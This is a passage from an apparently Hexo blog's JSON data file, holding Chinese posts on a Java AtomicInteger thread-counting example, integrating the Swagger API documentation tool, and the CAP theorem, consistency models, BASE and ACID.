class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.util.concurrent.CountDownLatch;</span><br><span class=\"line\">import java.util.concurrent.atomic.AtomicInteger;</span><br><span class=\"line\"></span><br><span class=\"line\">import javax.annotation.PostConstruct;</span><br><span class=\"line\">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class=\"line\">import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;</span><br><span class=\"line\">import org.springframework.stereotype.Component;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * @ClassName: AtomicIntegerHandle </span><br><span class=\"line\"> * @Description: AtomicInteger&#x7684;&#x4F7F;&#x7528;</span><br><span class=\"line\"> * @author wasim</span><br><span class=\"line\"> * @create at 2015-8-12 &#x4E0B;&#x5348;8:44:51</span><br><span class=\"line\"> *  </span><br><span class=\"line\"> */</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class AtomicIntegerHandle {</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t@Autowired</span><br><span class=\"line\">\tThreadPoolTaskExecutor executor;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t@PostConstruct</span><br><span class=\"line\">\tpublic void handleQuestionKnowledge(){</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tAtomicInteger atomicInteger = new AtomicInteger();</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tint round = 15; //&#x8981;&#x6267;&#x884C;&#x7684;&#x7EBF;&#x7A0B;&#x603B;&#x6570;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t//&#x5BFC;&#x51FA;&#x6587;&#x4EF6; </span><br><span class=\"line\">\t\texecutor.execute(new ExportStats(atomicInteger, round));</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t//&#x5BFC;&#x51FA;&#x6587;&#x4EF6;&#x524D;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5FAA;&#x73AF;&#x4E0B;&#x9762;12&#x4E2A;&#x7EBF;&#x7A0B;</span><br><span class=\"line\">\t\tfor(int i=0;i&lt;round;i++){</span><br><span class=\"line\">\t\t\texecutor.execute(new similarKnowledgeHandle(atomicInteger));</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t}</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tpublic class similarKnowledgeHandle implements Runnable{</span><br><span class=\"line\">\t\tAtomicInteger atomicInteger;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tpublic similarKnowledgeHandle(AtomicInteger atomicInteger) {</span><br><span class=\"line\">\t\t\tthis.atomicInteger =atomicInteger;</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t@Override</span><br><span class=\"line\">\t\tpublic void run() {</span><br><span class=\"line\">\t\t\tSystem.out.println(&quot;do some thing....&quot;);</span><br><span class=\"line\">\t\t\tatomicInteger.getAndIncrement();</span><br><span class=\"line\">\t\t\tSystem.out.println(atomicInteger.get()); //&#x663E;&#x793A;&#x5F53;&#x524D;&#x8BA1;&#x6570;</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t}</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tpublic class ExportStats implements Runnable{</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tAtomicInteger atomicInteger;</span><br><span class=\"line\">\t\tint round;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tpublic ExportStats(AtomicInteger atomicInteger, int round) {</span><br><span class=\"line\">\t\t\tthis.atomicInteger =atomicInteger;</span><br><span class=\"line\">\t\t\tthis.round = round;</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t@Override</span><br><span class=\"line\">\t\tpublic void run() {</span><br><span class=\"line\">\t\t\ttry {</span><br><span class=\"line\">\t\t\t\tboolean flag = true;</span><br><span class=\"line\">\t\t\t\twhile(flag){</span><br><span class=\"line\">\t\t\t\t\tif(atomicInteger.get() == round){</span><br><span class=\"line\">\t\t\t\t\t\tflag = false;</span><br><span class=\"line\">\t\t\t\t\t\tSystem.out.println(&quot;&#x9884;&#x5904;&#x7406;&#x5B8C;&#x6210;,&#x5F00;&#x59CB;&#x6267;&#x884C;&#x76F8;&#x5173;...&quot;);</span><br><span class=\"line\">\t\t\t\t\t} else {</span><br><span class=\"line\">\t\t\t\t\t\tSystem.out.println(&quot;wait...&quot;);</span><br><span class=\"line\">\t\t\t\t\t\tThread.sleep(1000);</span><br><span class=\"line\">\t\t\t\t\t}</span><br><span class=\"line\">\t\t\t\t}</span><br><span class=\"line\">\t\t\t} catch (Exception e) {</span><br><span class=\"line\">\t\t\t\te.printStackTrace();</span><br><span class=\"line\">\t\t\t}</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t}</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>"},{"title":"API文档工具-Swagger的集成","date":"2016-09-10T10:24:17.000Z","toc":false,"_content":"\n> 最近安装了API文档工具swagger，因为Github上已有详细安装教程，且安装过程中没有碰到大的阻碍，所以此文仅对这次安装做一份大致记录\n\n### 相关网站\n\nSwagger 官方地址： \nhttp://swagger.wordnik.com \n\nGithub安装详解【springmvc集成swagger】:\nhttps://github.com/rlogiacco/swagger-springmvc\n\n网上安装教程【可配合Github安装教程使用】：\nhttp://www.jianshu.com/p/5cfbe62a1569\nhttp://blog.csdn.net/fengspg/article/details/43705537\n\nSwagger注解详解：\nhttps://github.com/swagger-api/swagger-core/wiki/Annotations#apimodel\nhttp://www.cnblogs.com/java-zhao/p/5348113.html 【springboot + swagger】\n\n<font style=\"color:red\">API文档工具 RAML、Swagger和Blueprint三者的比较：</font>\nhttp://www.cnblogs.com/softidea/p/5728952.html\n\n<!-- more -->\n\n---\n\n### 错误记录\n\n配置完并成功启动项目后，报如下错误：\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/API%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7-Swagger%E7%9A%84%E9%9B%86%E6%88%90/1.png)\n\n**原因**：在修改配置文件index.html时，ip和端口中间多了一个斜杠，去掉斜杠即可。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/API%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7-Swagger%E7%9A%84%E9%9B%86%E6%88%90/2.png)\n\nPS：果不是以上原因造成，请移步 https://github.com/swagger-api/swagger-ui 查看此错误详细介绍:\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/API%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7-Swagger%E7%9A%84%E9%9B%86%E6%88%90/3.png)\n\n\n\n\n\n","source":"_posts/API文档工具-Swagger的集成.md","raw":"---\ntitle: API文档工具-Swagger的集成\ncategories:\n  - 运维部署\ntags:\n  - Swagger\ndate: 2016-9-10 18:24:17\ntoc: false\n\n---\n\n> 最近安装了API文档工具swagger，因为Github上已有详细安装教程，且安装过程中没有碰到大的阻碍，所以此文仅对这次安装做一份大致记录\n\n### 相关网站\n\nSwagger 官方地址： \nhttp://swagger.wordnik.com \n\nGithub安装详解【springmvc集成swagger】:\nhttps://github.com/rlogiacco/swagger-springmvc\n\n网上安装教程【可配合Github安装教程使用】：\nhttp://www.jianshu.com/p/5cfbe62a1569\nhttp://blog.csdn.net/fengspg/article/details/43705537\n\nSwagger注解详解：\nhttps://github.com/swagger-api/swagger-core/wiki/Annotations#apimodel\nhttp://www.cnblogs.com/java-zhao/p/5348113.html 【springboot + swagger】\n\n<font style=\"color:red\">API文档工具 RAML、Swagger和Blueprint三者的比较：</font>\nhttp://www.cnblogs.com/softidea/p/5728952.html\n\n<!-- more -->\n\n---\n\n### 错误记录\n\n配置完并成功启动项目后，报如下错误：\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/API%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7-Swagger%E7%9A%84%E9%9B%86%E6%88%90/1.png)\n\n**原因**：在修改配置文件index.html时，ip和端口中间多了一个斜杠，去掉斜杠即可。\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/API%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7-Swagger%E7%9A%84%E9%9B%86%E6%88%90/2.png)\n\nPS：果不是以上原因造成，请移步 https://github.com/swagger-api/swagger-ui 查看此错误详细介绍:\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/API%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7-Swagger%E7%9A%84%E9%9B%86%E6%88%90/3.png)\n\n\n\n\n\n","slug":"API文档工具-Swagger的集成","published":1,"updated":"2016-11-18T01:17:04.149Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrula40003gwtmxl0e201x","content":"<blockquote>\n<p>&#x6700;&#x8FD1;&#x5B89;&#x88C5;&#x4E86;API&#x6587;&#x6863;&#x5DE5;&#x5177;swagger&#xFF0C;&#x56E0;&#x4E3A;Github&#x4E0A;&#x5DF2;&#x6709;&#x8BE6;&#x7EC6;&#x5B89;&#x88C5;&#x6559;&#x7A0B;&#xFF0C;&#x4E14;&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;&#x4E2D;&#x6CA1;&#x6709;&#x78B0;&#x5230;&#x5927;&#x7684;&#x963B;&#x788D;&#xFF0C;&#x6240;&#x4EE5;&#x6B64;&#x6587;&#x4EC5;&#x5BF9;&#x8FD9;&#x6B21;&#x5B89;&#x88C5;&#x505A;&#x4E00;&#x4EFD;&#x5927;&#x81F4;&#x8BB0;&#x5F55;</p>\n</blockquote>\n<h3 id=\"&#x76F8;&#x5173;&#x7F51;&#x7AD9;\"><a href=\"#&#x76F8;&#x5173;&#x7F51;&#x7AD9;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x7F51;&#x7AD9;\"></a>&#x76F8;&#x5173;&#x7F51;&#x7AD9;</h3><p>Swagger &#x5B98;&#x65B9;&#x5730;&#x5740;&#xFF1A;<br><a href=\"http://swagger.wordnik.com\" target=\"_blank\" rel=\"external\">http://swagger.wordnik.com</a> </p>\n<p>Github&#x5B89;&#x88C5;&#x8BE6;&#x89E3;&#x3010;springmvc&#x96C6;&#x6210;swagger&#x3011;:<br><a href=\"https://github.com/rlogiacco/swagger-springmvc\" target=\"_blank\" rel=\"external\">https://github.com/rlogiacco/swagger-springmvc</a></p>\n<p>&#x7F51;&#x4E0A;&#x5B89;&#x88C5;&#x6559;&#x7A0B;&#x3010;&#x53EF;&#x914D;&#x5408;Github&#x5B89;&#x88C5;&#x6559;&#x7A0B;&#x4F7F;&#x7528;&#x3011;&#xFF1A;<br><a href=\"http://www.jianshu.com/p/5cfbe62a1569\" target=\"_blank\" rel=\"external\">http://www.jianshu.com/p/5cfbe62a1569</a><br><a href=\"http://blog.csdn.net/fengspg/article/details/43705537\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/fengspg/article/details/43705537</a></p>\n<p>Swagger&#x6CE8;&#x89E3;&#x8BE6;&#x89E3;&#xFF1A;<br><a href=\"https://github.com/swagger-api/swagger-core/wiki/Annotations#apimodel\" target=\"_blank\" rel=\"external\">https://github.com/swagger-api/swagger-core/wiki/Annotations#apimodel</a><br><a href=\"http://www.cnblogs.com/java-zhao/p/5348113.html\" target=\"_blank\" rel=\"external\">http://www.cnblogs.com/java-zhao/p/5348113.html</a> &#x3010;springboot + swagger&#x3011;</p>\n<p><font style=\"color:red\">API&#x6587;&#x6863;&#x5DE5;&#x5177; RAML&#x3001;Swagger&#x548C;Blueprint&#x4E09;&#x8005;&#x7684;&#x6BD4;&#x8F83;&#xFF1A;</font><br><a href=\"http://www.cnblogs.com/softidea/p/5728952.html\" target=\"_blank\" rel=\"external\">http://www.cnblogs.com/softidea/p/5728952.html</a></p>\n<a id=\"more\"></a>\n<hr>\n<h3 id=\"&#x9519;&#x8BEF;&#x8BB0;&#x5F55;\"><a href=\"#&#x9519;&#x8BEF;&#x8BB0;&#x5F55;\" class=\"headerlink\" title=\"&#x9519;&#x8BEF;&#x8BB0;&#x5F55;\"></a>&#x9519;&#x8BEF;&#x8BB0;&#x5F55;</h3><p>&#x914D;&#x7F6E;&#x5B8C;&#x5E76;&#x6210;&#x529F;&#x542F;&#x52A8;&#x9879;&#x76EE;&#x540E;&#xFF0C;&#x62A5;&#x5982;&#x4E0B;&#x9519;&#x8BEF;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/API%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7-Swagger%E7%9A%84%E9%9B%86%E6%88%90/1.png\" alt=\"\"></p>\n<p><strong>&#x539F;&#x56E0;</strong>&#xFF1A;&#x5728;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;index.html&#x65F6;&#xFF0C;ip&#x548C;&#x7AEF;&#x53E3;&#x4E2D;&#x95F4;&#x591A;&#x4E86;&#x4E00;&#x4E2A;&#x659C;&#x6760;&#xFF0C;&#x53BB;&#x6389;&#x659C;&#x6760;&#x5373;&#x53EF;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/API%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7-Swagger%E7%9A%84%E9%9B%86%E6%88%90/2.png\" alt=\"\"></p>\n<p>PS&#xFF1A;&#x679C;&#x4E0D;&#x662F;&#x4EE5;&#x4E0A;&#x539F;&#x56E0;&#x9020;&#x6210;&#xFF0C;&#x8BF7;&#x79FB;&#x6B65; <a href=\"https://github.com/swagger-api/swagger-ui\" target=\"_blank\" rel=\"external\">https://github.com/swagger-api/swagger-ui</a> &#x67E5;&#x770B;&#x6B64;&#x9519;&#x8BEF;&#x8BE6;&#x7EC6;&#x4ECB;&#x7ECD;:</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/API%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7-Swagger%E7%9A%84%E9%9B%86%E6%88%90/3.png\" alt=\"\"></p>\n","excerpt":"<blockquote>\n<p>&#x6700;&#x8FD1;&#x5B89;&#x88C5;&#x4E86;API&#x6587;&#x6863;&#x5DE5;&#x5177;swagger&#xFF0C;&#x56E0;&#x4E3A;Github&#x4E0A;&#x5DF2;&#x6709;&#x8BE6;&#x7EC6;&#x5B89;&#x88C5;&#x6559;&#x7A0B;&#xFF0C;&#x4E14;&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;&#x4E2D;&#x6CA1;&#x6709;&#x78B0;&#x5230;&#x5927;&#x7684;&#x963B;&#x788D;&#xFF0C;&#x6240;&#x4EE5;&#x6B64;&#x6587;&#x4EC5;&#x5BF9;&#x8FD9;&#x6B21;&#x5B89;&#x88C5;&#x505A;&#x4E00;&#x4EFD;&#x5927;&#x81F4;&#x8BB0;&#x5F55;</p>\n</blockquote>\n<h3 id=\"&#x76F8;&#x5173;&#x7F51;&#x7AD9;\"><a href=\"#&#x76F8;&#x5173;&#x7F51;&#x7AD9;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x7F51;&#x7AD9;\"></a>&#x76F8;&#x5173;&#x7F51;&#x7AD9;</h3><p>Swagger &#x5B98;&#x65B9;&#x5730;&#x5740;&#xFF1A;<br><a href=\"http://swagger.wordnik.com\">http://swagger.wordnik.com</a> </p>\n<p>Github&#x5B89;&#x88C5;&#x8BE6;&#x89E3;&#x3010;springmvc&#x96C6;&#x6210;swagger&#x3011;:<br><a href=\"https://github.com/rlogiacco/swagger-springmvc\">https://github.com/rlogiacco/swagger-springmvc</a></p>\n<p>&#x7F51;&#x4E0A;&#x5B89;&#x88C5;&#x6559;&#x7A0B;&#x3010;&#x53EF;&#x914D;&#x5408;Github&#x5B89;&#x88C5;&#x6559;&#x7A0B;&#x4F7F;&#x7528;&#x3011;&#xFF1A;<br><a href=\"http://www.jianshu.com/p/5cfbe62a1569\">http://www.jianshu.com/p/5cfbe62a1569</a><br><a href=\"http://blog.csdn.net/fengspg/article/details/43705537\">http://blog.csdn.net/fengspg/article/details/43705537</a></p>\n<p>Swagger&#x6CE8;&#x89E3;&#x8BE6;&#x89E3;&#xFF1A;<br><a href=\"https://github.com/swagger-api/swagger-core/wiki/Annotations#apimodel\">https://github.com/swagger-api/swagger-core/wiki/Annotations#apimodel</a><br><a href=\"http://www.cnblogs.com/java-zhao/p/5348113.html\">http://www.cnblogs.com/java-zhao/p/5348113.html</a> &#x3010;springboot + swagger&#x3011;</p>\n<p><font style=\"color:red\">API&#x6587;&#x6863;&#x5DE5;&#x5177; RAML&#x3001;Swagger&#x548C;Blueprint&#x4E09;&#x8005;&#x7684;&#x6BD4;&#x8F83;&#xFF1A;</font><br><a href=\"http://www.cnblogs.com/softidea/p/5728952.html\">http://www.cnblogs.com/softidea/p/5728952.html</a></p>","more":"<hr>\n<h3 id=\"&#x9519;&#x8BEF;&#x8BB0;&#x5F55;\"><a href=\"#&#x9519;&#x8BEF;&#x8BB0;&#x5F55;\" class=\"headerlink\" title=\"&#x9519;&#x8BEF;&#x8BB0;&#x5F55;\"></a>&#x9519;&#x8BEF;&#x8BB0;&#x5F55;</h3><p>&#x914D;&#x7F6E;&#x5B8C;&#x5E76;&#x6210;&#x529F;&#x542F;&#x52A8;&#x9879;&#x76EE;&#x540E;&#xFF0C;&#x62A5;&#x5982;&#x4E0B;&#x9519;&#x8BEF;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/API%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7-Swagger%E7%9A%84%E9%9B%86%E6%88%90/1.png\" alt=\"\"></p>\n<p><strong>&#x539F;&#x56E0;</strong>&#xFF1A;&#x5728;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;index.html&#x65F6;&#xFF0C;ip&#x548C;&#x7AEF;&#x53E3;&#x4E2D;&#x95F4;&#x591A;&#x4E86;&#x4E00;&#x4E2A;&#x659C;&#x6760;&#xFF0C;&#x53BB;&#x6389;&#x659C;&#x6760;&#x5373;&#x53EF;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/API%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7-Swagger%E7%9A%84%E9%9B%86%E6%88%90/2.png\" alt=\"\"></p>\n<p>PS&#xFF1A;&#x679C;&#x4E0D;&#x662F;&#x4EE5;&#x4E0A;&#x539F;&#x56E0;&#x9020;&#x6210;&#xFF0C;&#x8BF7;&#x79FB;&#x6B65; <a href=\"https://github.com/swagger-api/swagger-ui\">https://github.com/swagger-api/swagger-ui</a> &#x67E5;&#x770B;&#x6B64;&#x9519;&#x8BEF;&#x8BE6;&#x7EC6;&#x4ECB;&#x7ECD;:</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/API%E6%96%87%E6%A1%A3%E5%B7%A5%E5%85%B7-Swagger%E7%9A%84%E9%9B%86%E6%88%90/3.png\" alt=\"\"></p>"},{"title":"CAP原理、一致性模型、BASE理论和ACID特性","date":"2016-10-21T14:10:00.000Z","_content":"\n### CAP原理\n在理论计算机科学中，CAP定理（CAP theorem），又被称作布鲁尔定理（Brewer's theorem），它指出对于一个分布式计算系统来说，不可能同时满足以下三点：\n\n- **一致性（Consistence）**\n分布式系统中的所有数据备份，在同一时刻是否同样的值。（等同于所有节点访问同一份最新的数据副本）\n\n- **可用性（Availability）**\n集群出现故障节点后，是否还能响应客户端的读写请求。（对数据更新具备高可用性）\n\n- **分区容忍性（Partition tolerance）** \n实际中通信产生延时。系统如果不能在时限内达成数据一致性，就意味着发生了分区的情况，必须就当前操作在C点和A点之间做出选择。\n\nCAP原理指的是，CAP的三个要素最多只能同时实现两点，不可能三者兼顾。因此在进行分布式架构设计时，必须做出取舍。而对于分布式数据系统，分区容忍性是基本要求，否则就失去了价值。\n\n因此设计分布式数据系统，就是在一致性和可用性之间取一个平衡。**对于大多数web应用，其实并不需要强一致性，因此牺牲一致性而换取高可用性，是目前多数分布式数据库产品的方向。**\n\n<!-- more -->\n\n当然，并不是完全不管数据的一致性。牺牲一致性，只是不再要求关系型数据库中的强一致性，而是只要系统能达到最终一致性即可，考虑到客户体验，这个最终一致的时间窗口，要尽可能的对用户透明，也就是需要保障“用户感知到的一致性”。通常是通过数据的多份异步复制来实现系统的高可用和数据的最终一致性的，“用户感知到的一致性”的时间窗口则取决于数据复制到一致状态的时间。\n\n---\n\n### 一致性模型\n\n#### 强一致性\n\n当更新操作完成之后，任何多个后续进程或者线程的访问都会返回最新的更新过的值。这种是对用户最友好的，就是用户上一次写什么，下一次就保证能读到什么。但是这种实现对性能影响较大。\n\n#### 弱一致性\n\n系统并不保证续进程或者线程的访问都会返回最新的更新过的值。系统在数据写入成功之后，不承诺立即可以读到最新写入的值，也不会具体的承诺多久之后可以读到。但会尽可能保证在某个时间级别（比如秒级别）之后，可以让数据达到一致性状态。\n\n#### 最终一致性\n\n弱一致性的特定形式。系统保证在没有后续更新的前提下，系统最终返回上一次更新操作的值。在没有故障发生的前提下，不一致窗口的时间主要受通信延迟，系统负载和复制副本的个数影响。DNS是一个典型的最终一致性系统。\n\n#### 最终一致性模型的变种\n\n- **因果一致性：**如果A进程在更新之后向B进程通知更新的完成，那么B的访问操作将会返回更新的值。如果没有因果关系的C进程将会遵循最终一致性的规则。\n- 读己所写一致性：因果一致性的特定形式。一个进程总可以读到自己更新的数据。\n- **会话一致性：**读己所写一致性的特定形式。进程在访问存储系统同一个会话内，系统保证该进程读己之所写。\n- **单调读一致性：**如果一个进程已经读取到一个特定值，那么该进程不会读取到该值以前的任何值。\n- **单调写一致性：**系统保证对同一个进程的写操作串行化。\n\n上述最终一致性的不同方式可以进行组合，例如单调读一致性和读己之所写一致性就可以组合实现。并且从实践的角度来看，这两者的组合，读取自己更新的 数据，和一旦读取到最新的版本不会再读取旧版本，对于此架构上的程序开发来说，会少很多额外的烦恼。\n\n---\n\n### BASE理论——CAP理论的延伸\n\n***BASE理论是对CAP理论的延伸***，核心思想是即使无法做到强一致性（Strong Consistency，CAP的一致性就是强一致性），但应用可以采用适合的方式达到最终一致性（Eventual Consitency）。**Redis等众多系统构建于这个理论之上。**\n\n- **基本可用（Basically Available）**\n基本可用是指分布式系统在出现故障的时候，允许损失部分可用性，即保证核心可用。\n电商大促时，为了应对访问量激增，部分用户可能会被引导到降级页面，服务层也可能只提供降级服务。这就是损失部分可用性的体现。\n\n- **软状态（ Soft State）**\n软状态是指允许系统存在中间状态，而该中间状态不会影响系统整体可用性。分布式存储中一般一份数据至少会有三个副本，允许不同节点间副本同步的延时就是软状态的体现。mysql replication的异步复制也是一种体现。\n\n- **最终一致性（ Eventual Consistency）**\n最终一致性是指系统中的所有数据副本经过一定时间后，最终能够达到一致的状态。弱一致性和强一致性相反，最终一致性是弱一致性的一种特殊情况。\n\n---\n\n### BASE和ACID的区别与联系\n\nACID，是指数据库管理系统（DBMS）在写入/更新资料的过程中，为保证事务（transaction）是正确可靠的，所必须具备的四个特性：原子性（atomicity，或称不可分割性）、一致性（consistency）、隔离性（isolation，又称独立性）、持久性（durability）。\n\n- **原子性：**一个事务（transaction）中的所有操作，要么全部完成，要么全部不完成，不会结束在中间某个环节。事务在执行过程中发生错误，会被回滚（Rollback）到事务开始前的状态，就像这个事务从来没有执行过一样。\n\n- **一致性：**在事务开始之前和事务结束以后，数据库的完整性没有被破坏。这表示写入的资料必须完全符合所有的预设规则，这包含资料的精确度、串联性以及后续数据库可以自发性地完成预定的工作。\n\n- **隔离性：**数据库允许多个并发事务同时对齐数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致。事务隔离分为不同级别，包括读未提交（Read uncommitted）、读提交（read committed）、可重复读（repeatable read）和串行化（Serializable）。\n\n- **持久性：**事务处理结束后，对数据的修改就是永久的，即便系统故障也不会丢失。\n\nACID是传统数据库常用的设计理念, 追求强一致性模型。BASE支持的是大型分布式系统，提出通过牺牲强一致性获得高可用性。\n\n**ACID和BASE代表了两种截然相反的设计哲学，分处【一致性-可用性】分布图谱的两极。**\n\n","source":"_posts/CAP原理、一致性模型、BASE理论和ACID特性.md","raw":"---\ntitle: CAP原理、一致性模型、BASE理论和ACID特性\ncategories:\n  - 算法及理论\ntags:\n  - CAP\n  - BASE\n  - ACID\ndate: 2016-10-21 22:10:00\n\n---\n\n### CAP原理\n在理论计算机科学中，CAP定理（CAP theorem），又被称作布鲁尔定理（Brewer's theorem），它指出对于一个分布式计算系统来说，不可能同时满足以下三点：\n\n- **一致性（Consistence）**\n分布式系统中的所有数据备份，在同一时刻是否同样的值。（等同于所有节点访问同一份最新的数据副本）\n\n- **可用性（Availability）**\n集群出现故障节点后，是否还能响应客户端的读写请求。（对数据更新具备高可用性）\n\n- **分区容忍性（Partition tolerance）** \n实际中通信产生延时。系统如果不能在时限内达成数据一致性，就意味着发生了分区的情况，必须就当前操作在C点和A点之间做出选择。\n\nCAP原理指的是，CAP的三个要素最多只能同时实现两点，不可能三者兼顾。因此在进行分布式架构设计时，必须做出取舍。而对于分布式数据系统，分区容忍性是基本要求，否则就失去了价值。\n\n因此设计分布式数据系统，就是在一致性和可用性之间取一个平衡。**对于大多数web应用，其实并不需要强一致性，因此牺牲一致性而换取高可用性，是目前多数分布式数据库产品的方向。**\n\n<!-- more -->\n\n当然，并不是完全不管数据的一致性。牺牲一致性，只是不再要求关系型数据库中的强一致性，而是只要系统能达到最终一致性即可，考虑到客户体验，这个最终一致的时间窗口，要尽可能的对用户透明，也就是需要保障“用户感知到的一致性”。通常是通过数据的多份异步复制来实现系统的高可用和数据的最终一致性的，“用户感知到的一致性”的时间窗口则取决于数据复制到一致状态的时间。\n\n---\n\n### 一致性模型\n\n#### 强一致性\n\n当更新操作完成之后，任何多个后续进程或者线程的访问都会返回最新的更新过的值。这种是对用户最友好的，就是用户上一次写什么，下一次就保证能读到什么。但是这种实现对性能影响较大。\n\n#### 弱一致性\n\n系统并不保证续进程或者线程的访问都会返回最新的更新过的值。系统在数据写入成功之后，不承诺立即可以读到最新写入的值，也不会具体的承诺多久之后可以读到。但会尽可能保证在某个时间级别（比如秒级别）之后，可以让数据达到一致性状态。\n\n#### 最终一致性\n\n弱一致性的特定形式。系统保证在没有后续更新的前提下，系统最终返回上一次更新操作的值。在没有故障发生的前提下，不一致窗口的时间主要受通信延迟，系统负载和复制副本的个数影响。DNS是一个典型的最终一致性系统。\n\n#### 最终一致性模型的变种\n\n- **因果一致性：**如果A进程在更新之后向B进程通知更新的完成，那么B的访问操作将会返回更新的值。如果没有因果关系的C进程将会遵循最终一致性的规则。\n- 读己所写一致性：因果一致性的特定形式。一个进程总可以读到自己更新的数据。\n- **会话一致性：**读己所写一致性的特定形式。进程在访问存储系统同一个会话内，系统保证该进程读己之所写。\n- **单调读一致性：**如果一个进程已经读取到一个特定值，那么该进程不会读取到该值以前的任何值。\n- **单调写一致性：**系统保证对同一个进程的写操作串行化。\n\n上述最终一致性的不同方式可以进行组合，例如单调读一致性和读己之所写一致性就可以组合实现。并且从实践的角度来看，这两者的组合，读取自己更新的 数据，和一旦读取到最新的版本不会再读取旧版本，对于此架构上的程序开发来说，会少很多额外的烦恼。\n\n---\n\n### BASE理论——CAP理论的延伸\n\n***BASE理论是对CAP理论的延伸***，核心思想是即使无法做到强一致性（Strong Consistency，CAP的一致性就是强一致性），但应用可以采用适合的方式达到最终一致性（Eventual Consitency）。**Redis等众多系统构建于这个理论之上。**\n\n- **基本可用（Basically Available）**\n基本可用是指分布式系统在出现故障的时候，允许损失部分可用性，即保证核心可用。\n电商大促时，为了应对访问量激增，部分用户可能会被引导到降级页面，服务层也可能只提供降级服务。这就是损失部分可用性的体现。\n\n- **软状态（ Soft State）**\n软状态是指允许系统存在中间状态，而该中间状态不会影响系统整体可用性。分布式存储中一般一份数据至少会有三个副本，允许不同节点间副本同步的延时就是软状态的体现。mysql replication的异步复制也是一种体现。\n\n- **最终一致性（ Eventual Consistency）**\n最终一致性是指系统中的所有数据副本经过一定时间后，最终能够达到一致的状态。弱一致性和强一致性相反，最终一致性是弱一致性的一种特殊情况。\n\n---\n\n### BASE和ACID的区别与联系\n\nACID，是指数据库管理系统（DBMS）在写入/更新资料的过程中，为保证事务（transaction）是正确可靠的，所必须具备的四个特性：原子性（atomicity，或称不可分割性）、一致性（consistency）、隔离性（isolation，又称独立性）、持久性（durability）。\n\n- **原子性：**一个事务（transaction）中的所有操作，要么全部完成，要么全部不完成，不会结束在中间某个环节。事务在执行过程中发生错误，会被回滚（Rollback）到事务开始前的状态，就像这个事务从来没有执行过一样。\n\n- 